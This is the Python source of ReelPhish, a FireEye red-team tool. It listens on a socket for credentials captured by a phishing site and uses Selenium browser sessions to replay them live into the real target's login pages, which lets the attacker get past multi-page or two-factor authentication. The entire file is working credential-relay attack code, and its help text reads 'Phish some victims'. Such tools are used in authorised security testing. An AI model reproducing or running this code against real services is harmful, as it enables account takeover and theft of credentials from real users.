"""
ReelPhish - Automated Real Time Phishing

Authors: Pan Chan, Trevor Haskell

Copyright (C) 2018 FireEye, Inc. All Rights Reserved.
"""
# pylint: disable=I0011,C0325
import argparse
import logging
import os
import threading
import signal
import sys
import collections
import time
import socket
import urllib

from Queue import Queue

from selenium import webdriver
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.common.exceptions import NoSuchElementException

__version__ = '0.1.0'

_ALLOWED_BROWSERS = ['IE', 'FF', 'Chrome']

_SEND_QUEUE = Queue()
_RECEIVE_DICT = dict()

_LOGGER = logging.getLogger('phishing_driver.{}'.format(__version__))


class DriverThread(threading.Thread):
    """ Manages a client browser session while authentication is in process """
    def __init__(self, args, thread_send_queue, thread_receive_queue, tid, exit_sig, can_exit):
        super(DriverThread, self).__init__()
        self.args = args
        self.thread_send_queue = thread_send_queue
        self.thread_receive_queue = thread_receive_queue
        self.tid = tid
        self.should_exit = exit_sig
        self.exit = can_exit

    def run(self):
        _LOGGER.info("Browser thread starting up...")
        pargs = self.args

        while not self.should_exit.is_set():
            browser = select_browser(pargs.browser[0])
            browser.get(pargs.url[0])
            for pagenum in range(0, pargs.numpages):
                _LOGGER.info("%s authentication pages left to do for browser %s", (pargs.numpages - pagenum),
                             self.tid)  # noqa pylint: disable=I0011,C0301
                parameter_dict = collections.OrderedDict()
                param_list = self.thread_send_queue.get()

                _LOGGER.debug("Parameter list received: %s", param_list)
                for keypair in param_list:
                    parsed_value = urllib.unquote(keypair.split('=')[1])
                    parameter_dict[keypair.split('=')[0]] = parsed_value
                _LOGGER.debug("Internal parameter dictionary: %s", parameter_dict)

                elem = None
                for key, value in parameter_dict.iteritems():
                    _LOGGER.debug("Sending field name: %s", key)
                    _LOGGER.debug("Value is: %s", value)
                    try:
                        elem = browser.find_element_by_name(key)
                        if elem.tag_name == "select":
                            select = Select(elem)
                            select.select_by_visible_text(value)
                        elif elem.get_attribute("type") == "checkbox":
                            if str(elem.is_selected()).lower() != value.lower():
                                elem.click()
                                # Workaround for IE, requires two clicks
                                if pargs.browser[0] == "IE":
                                    elem.click()
                        else:
                            elem.send_keys(value)
                    except NoSuchElementException:
                        if pargs.override:
                            _LOGGER.warning("Ignoring error: Unable to find field name: %s", key)
                        else:
                            _LOGGER.critical("Unable to find field name: %s", key)
                            exit(1)
                if pargs.submit is None:
                    elem.submit()
                else:
                    submit_button = browser.find_element_by_name(pargs.submit[0])
                    submit_button.click()

                # OPTIONAL: Store response page if scraping the page is required
                # response_content = browser.page_source
                # if pargs.verbose:
                #  print("Length of response: %s" % str(len(response_content)))

                # When using a single phishing page, no data usually needs to go back.
                # We just need to indicate we are finished to the phishing web server.
                # This can be customized to your liking.
                _LOGGER.debug("Finished, sending example data back")
                return_message = "Example data for browser session %s" % self.tid
                self.thread_receive_queue.put(return_message)

            _LOGGER.info("All authentication pages finished for browser %s, exiting...", self.tid)
            break
        return


class MainNetworkSocket(threading.Thread):
    """ Manages the main socket connection and spawns new threads to manage connections """
    def __init__(self, exit_sig, can_exit):
        super(MainNetworkSocket, self).__init__()
        self.should_exit = exit_sig
        self.exit = can_exit
        # You can customize the host and port below.
        # Be sure the port number is the same in your phishing site.
        self.host = ''
        self.port = 2135
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setblocking(0)
        self.sock.settimeout(None)
        self.sock.bind((self.host, self.port))

    def run(self):
        _LOGGER.info("Brought up main networking")
        self.sock.listen(5)
        while not self.should_exit.is_set():
            conn, addr = self.sock.accept()
            _LOGGER.info("Accepted connection from %s", repr(addr))
            client_thread = ClientHandler(conn, addr)
            client_thread.start()
        _LOGGER.info("Terminating listener")
        self.sock.shutdown(socket.SHUT_RDWR)
        self.sock.close()


class ClientHandler(threading.Thread):
    """ Handles an individual client's connection """
    def __init__(self, conn, addr):
        super(ClientHandler, self).__init__()
        self.conn = conn
        self.addr = addr

    def run(self):
        _LOGGER.debug("Inside network handling thread for %s", repr(self.addr))
        data = self.conn.recv(1024)
        parsed_data = (data.split('\r\n\r\n')[1]).split('&')
        session_id = parsed_data[0]
        message_packet = [session_id, parsed_data[1:]]
        _LOGGER.debug("Full message packet to be sent to main dispatcher from client %s: %s",
                      repr(self.addr), message_packet)
        _SEND_QUEUE.put(message_packet)
        # The phishing web server makes the request to this script and provides phished credentials.
        # We respond back with an indication of success and optionally provide scraped data from the page.
        # Until we are finished entering credentials, this transaction is not finished.
        while True:
            if session_id not in _RECEIVE_DICT:
                time.sleep(0.05)
            else:
                _LOGGER.debug("Found message to send for %s", session_id)
                send_packet = _RECEIVE_DICT[session_id].get()
                resp = "HTTP/1.1 200 OK\r\n\r\n"
                resp += send_packet
                _LOGGER.debug("Sending the following packet: %s", resp)
                self.conn.send(resp)
                self.conn.close()
                break
        _LOGGER.info("Network thread for session %s finished", repr(self.addr))


def parse_args():
    """ Parses the CLI flags """
    # pylint: disable=I0011,C0301
    parser = argparse.ArgumentParser(description="Phish some victims...")
    parser.add_argument('--browser', nargs=1, help='<Required> Set Browser Type (IE, FF, Chrome, or Safari)',
                        required=True, choices=_ALLOWED_BROWSERS)
    parser.add_argument('--submit', nargs=1, help='<Optional> Set submission button name from form', required=False,
                        action='store')
    parser.add_argument('--url', nargs=1, help='<Required> URL to target', required=True)
    parser.add_argument('--numpages', type=int, help='<Optional> Number of authentication pages in web application'
                        ' if none are specified, this defaults to 1', required=False, default=1)
    parser.add_argument('--logging', default='info', action='store', required=False,
                        help='<Optional> Increase verbosity on command line (debug, info, warn, error, critical)')
    parser.add_argument('--override', help='<Optional> Ignore missing element errors', required=False,
                        default=False, action='store_true')

    return parser.parse_args()


def select_browser(browser_selection):
    """
       Implements operating system checking to determine appropriate browser support
       Raises exception when unsupported operating system or browser is found
       Currently supported operating systems and browsers:
           * Windows: Internet Explorer (IE), Firefox (FF), Chrome
           * Linux: Firefox (FF), Chrome

       Returns browser object corresponding to selection choice (browser_selection)
    """
    if sys.platform == "win32":
        current_path = sys.path[0]
        if browser_selection == "IE":
            ie_path = current_path + "\\IEDriver.exe"
            return webdriver.Ie(ie_path)
        elif browser_selection == "Chrome":
            chrome_path = current_path + "\\ChromeDriver.exe"
            return webdriver.Chrome(chrome_path)
        # Firefox selenium implementation requires gecko executable to be in PATH
        elif browser_selection == "FF":
            firefox_driver_path = current_path + "\\FFDriver.exe"
            firefox_capabilities = DesiredCapabilities.FIREFOX
            firefox_capabilities['marionette'] = True
            return webdriver.Firefox(capabilities=firefox_capabilities, executable_path=firefox_driver_path)
        else:
            raise Exception("Invalid Windows browser selection (IE, Chrome, and FF supported)")
    elif sys.platform == "linux" or sys.platform == "linux2":
        current_path = os.path.dirname(os.path.abspath(__file__))
        if browser_selection == "FF":
            firefox_driver_path = current_path + "/FFDriver.bin"
            firefox_capabilities = DesiredCapabilities.FIREFOX
            firefox_capabilities['marionette'] = True
            firefox_capabilities['executable_path'] = firefox_driver_path
            return webdriver.Firefox(capabilities=firefox_capabilities)
        elif browser_selection == "Chrome":
            chrome_path = current_path + "/ChromeDriver.bin"
            return webdriver.Chrome(chrome_path)
        else:
            raise Exception("Invalid Linux browser selection (Chrome and FF supported)")
    else:
        raise Exception("Operating system not supported")


def add_signal_handler(eventer):
    """ Signal handler """
    def graceful_exit(sig, frame):
        print('gracefully stopping')
        eventer.set()
        signal.signal(signal.SIGINT, signal.SIG_DFL)
        signal.signal(signal.SIGTERM, signal.SIG_DFL)

    return graceful_exit


def main():
    """ Initializes and runs the phishing script """
    args = parse_args()

    log_levels = {
        'debug': logging.DEBUG,
        'warn': logging.WARN,
        'warning': logging.WARN,
        'error': logging.ERROR,
        'critical': logging.CRITICAL,
    }
    log_fmt = '%(levelname) -8s %(asctime)s [%(filename)s %(lineno)d] %(funcName)s: %(message)s'
    _LOGGER.setLevel(log_levels.get(args.logging, logging.INFO))
    log_fh = logging.StreamHandler(stream=sys.stdout)
    log_fh.setFormatter(logging.Formatter(log_fmt))
    _LOGGER.addHandler(log_fh)

    exit_sig = threading.Event()
    can_exit = threading.Event()

    signal.signal(signal.SIGINT, add_signal_handler(exit_sig))
    signal.signal(signal.SIGTERM, add_signal_handler(exit_sig))
    signal.signal(signal.SIGILL, add_signal_handler(exit_sig))
    signal.signal(signal.SIGABRT, add_signal_handler(exit_sig))

    network_socket = MainNetworkSocket(exit_sig, can_exit)
    _LOGGER.info("Starting main networking...")
    network_socket.start()

    running_sessions = collections.OrderedDict()

    while not can_exit.wait(0.05):
        if not _SEND_QUEUE.empty():
            message_packet = _SEND_QUEUE.get()
            session_id = message_packet[0]
            if session_id not in running_sessions:
                thread_send_queue = Queue()
                thread_receive_queue = Queue()
                thread_send_queue.put((message_packet[1:])[0])
                driver_thread = DriverThread(args, thread_send_queue, thread_receive_queue,
                                             session_id, exit_sig, can_exit)
                running_sessions[message_packet[0]] = [
                    driver_thread,
                    thread_send_queue,
                    thread_receive_queue,
                ]
                driver_thread.start()
            else:
                running_sessions[session_id][1].put((message_packet[1:])[0])
        for key, value in running_sessions.iteritems():
            if not value[2].empty():
                driver_packet = value[2].get()
                if key not in _RECEIVE_DICT:
                    _RECEIVE_DICT[key] = Queue()
                _LOGGER.debug("Sending %s driver packet to dispatcher", driver_packet)
                _RECEIVE_DICT[key].put(driver_packet)
            if not value[0].is_alive():
                _LOGGER.info("Removing browser thread for %s", key)
                del running_sessions[key]


if __name__ == '__main__':
    main()
